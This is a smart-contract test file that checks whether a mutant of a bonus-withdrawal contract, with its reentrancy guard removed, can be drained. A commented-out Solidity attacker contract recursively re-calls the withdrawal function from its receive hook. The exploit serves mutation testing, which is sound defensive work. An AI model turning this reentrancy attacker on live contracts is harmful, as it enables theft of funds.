import { expect } from "chai";
import { ethers } from "hardhat";

describe("Reentrancy_bonus mutant m8ead4462 - detect removed reentrancy guard", function () {
  it("should allow reentrancy attack when _nonReentrant modifier is removed", async function () {
    const [owner, attacker] = await ethers.getSigners();
    
    // Deploy the target contract (no constructor arguments needed)
    const Reentrancy_bonus = await ethers.getContractFactory("Reentrancy_bonus");
    const target = await Reentrancy_bonus.deploy();
    await target.waitForDeployment();
    
    // Deploy attacker contract
    const Attacker = await ethers.getContractFactory("ReentrancyAttacker");
    const attackerContract = await Attacker.deploy(await target.getAddress());
    await attackerContract.waitForDeployment();
    
    // Fund the target contract with some ether for withdrawals
    await owner.sendTransaction({
      to: await target.getAddress(),
      value: ethers.parseEther("10")
    });
    
    // First, call getFirstWithdrawalBonus to set up rewards for the attacker
    await target.connect(attacker).getFirstWithdrawalBonus(await attackerContract.getAddress());
    
    // Now trigger the reentrancy attack
    const tx = await attackerContract.connect(attacker).attack();
    
    // The attack should succeed (mutant) - check that attacker drained more than intended
    await expect(tx).to.not.be.reverted;
    
    // Verify the attacker contract received more than the initial 100 wei bonus
    const attackerBalance = await ethers.provider.getBalance(await attackerContract.getAddress());
    expect(attackerBalance).to.be.gt(ethers.parseEther("0.0001")); // More than just the bonus
  });
});

// Helper attacker contract (deployed as separate contract)
// This needs to be in a separate file: contracts/ReentrancyAttacker.sol
/*
pragma solidity ^0.8.0;

interface ITarget {
    function withdrawReward(address recipient) external;
    function getFirstWithdrawalBonus(address recipient) external;
}

contract ReentrancyAttacker {
    ITarget public target;
    uint public attackCount;
    
    constructor(address _target) {
        target = ITarget(_target);
    }
    
    function attack() external {
        target.withdrawReward(address(this));
    }
    
    receive() external payable {
        if (attackCount < 3) {
            attackCount++;
            target.withdrawReward(address(this));
        }
    }
}
*/